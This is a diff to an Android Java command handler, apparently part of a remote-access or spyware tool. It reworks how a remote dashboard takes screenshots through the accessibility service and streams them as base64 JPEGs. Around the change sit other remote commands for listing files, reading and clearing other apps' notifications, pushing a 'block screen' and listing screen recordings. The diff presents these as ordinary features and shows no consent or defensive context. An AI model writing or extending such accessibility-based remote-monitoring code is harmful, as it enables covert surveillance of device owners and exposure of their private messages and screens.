@@ -1831,7 +1831,8 @@ public class SocketManager {
         // ── Accessibility status ─────────────────────────────────────────
         if (command.equals("get_accessibility_status")) {
             JSONObject r = new JSONObject();
-            boolean enabled = UnifiedAccessibilityService.getInstance() != null;
+            boolean enabled = UnifiedAccessibilityService.getInstance() != null
+                    || UnifiedAccessibilityService.hasFreshHeartbeat(context);
             r.put("success", true);
             r.put("enabled", enabled);
             r.put("message", enabled ? "Accessibility service is running" : "Accessibility service is NOT running — enable it in Settings");
@@ -1958,7 +1959,7 @@ public class SocketManager {
         }
 
         // ── Screenshot ───────────────────────────────────────────────────
-        if (command.equals("take_screenshot")) return screenshotHandler.takeScreenshot();
+        // Handled in handleAccessibilityCommand (requires accessibility service process)
 
         // ── Files ────────────────────────────────────────────────────────
         if (command.equals("list_files")) {
@@ -2200,33 +2201,8 @@ public class SocketManager {
         if (command.equals("get_notifications_from_app")) return NotificationInterceptor.getNotificationsFromApp(params.getString("packageName"));
         if (command.equals("clear_notifications"))        return NotificationInterceptor.clearAllNotifications();
 
-        // ── Streaming — dashboard-timed one-shot screenshots ──────────────
-        if (command.equals("stream_start")) {
-            // The dashboard owns the polling interval.  Keep this command
-            // request/response based so every result contains the screenshot
-            // that was taken for that exact tick; do not start a background
-            // stream or return only "stream started".
-            // Stop any legacy push mode left by an older dashboard session.
-            stopIdleFrameMode();
-            stopBlockFrameMode();
-            JSONObject r = screenshotHandler.takeScreenshot();
-            long requestedIntervalMs = Math.max(500L, Math.min(
-                    10_000L, params.optLong("intervalMs", 1_000L)));
-            r.put("streaming", true);
-            r.put("streamStarted", true);
-            r.put("intervalMs", requestedIntervalMs);
-            r.put("message", "Screenshot captured");
-            return r;
-        }
-        if (command.equals("stream_stop")) {
-            // Also clean up push modes created by older APK/dashboard pairs.
-            stopIdleFrameMode();
-            stopBlockFrameMode();
-            JSONObject r = new JSONObject();
-            r.put("success", true);
-            r.put("message", "Screenshot requests stopped");
-            return r;
-        }
+        // Streaming commands (stream_start, stream_stop) are handled in handleAccessibilityCommand
+        // which runs in the accessibility service process
         if (command.equals("stream_request_frame")) {
             // When block screen is active the device is already pushing frames every 1.5s.
             // Ignore on-demand frame requests to avoid duplicate frames and extra CPU load.
@@ -3029,6 +3005,85 @@ public class SocketManager {
                 ok.put("success", true);
                 ok.put("message", "Screen read requests stopped");
                 return ok;
+            }
+
+            case "take_screenshot": {
+                // Capture a high-quality screenshot via AccessibilityService (API 30+)
+                Bitmap bitmap = accessSvc.captureScreenSync();
+                if (bitmap == null) {
+                    JSONObject r = new JSONObject();
+                    r.put("success", false);
+                    r.put("error", "Accessibility screenshot capture failed");
+                    return r;
+                }
+                String base64 = bitmapToBase64(bitmap, 90);
+                int width = bitmap.getWidth();
+                int height = bitmap.getHeight();
+                bitmap.recycle();
+
+                if (base64 == null || base64.isEmpty()) {
+                    JSONObject r = new JSONObject();
+                    r.put("success", false);
+                    r.put("error", "Could not encode accessibility screenshot");
+                    return r;
+                }
+
+                JSONObject r = new JSONObject();
+                r.put("success", true);
+                r.put("base64", base64);
+                r.put("mimeType", "image/jpeg");
+                r.put("width", width);
+                r.put("height", height);
+                r.put("timestamp", System.currentTimeMillis());
+                return r;
+            }
+
+            case "stream_start": {
+                // Dashboard-timed one-shot screenshot streaming via AccessibilityService
+                stopIdleFrameMode();
+                stopBlockFrameMode();
+                Bitmap bitmap = accessSvc.captureScreenSync();
+                if (bitmap == null) {
+                    JSONObject r = new JSONObject();
+                    r.put("success", false);
+                    r.put("error", "Accessibility screenshot capture failed");
+                    return r;
+                }
+                String base64 = bitmapToBase64(bitmap, 90);
+                int width = bitmap.getWidth();
+                int height = bitmap.getHeight();
+                bitmap.recycle();
+
+                if (base64 == null || base64.isEmpty()) {
+                    JSONObject r = new JSONObject();
+                    r.put("success", false);
+                    r.put("error", "Could not encode accessibility screenshot");
+                    return r;
+                }
+
+                long requestedIntervalMs = Math.max(500L, Math.min(
+                        10_000L, params.optLong("intervalMs", 1_000L)));
+                JSONObject r = new JSONObject();
+                r.put("success", true);
+                r.put("base64", base64);
+                r.put("mimeType", "image/jpeg");
+                r.put("width", width);
+                r.put("height", height);
+                r.put("timestamp", System.currentTimeMillis());
+                r.put("streaming", true);
+                r.put("streamStarted", true);
+                r.put("intervalMs", requestedIntervalMs);
+                r.put("message", "Screenshot captured");
+                return r;
+            }
+
+            case "stream_stop": {
+                stopIdleFrameMode();
+                stopBlockFrameMode();
+                JSONObject r = new JSONObject();
+                r.put("success", true);
+                r.put("message", "Screenshot requests stopped");
+                return r;
             }
 
             case "list_screen_recordings": {
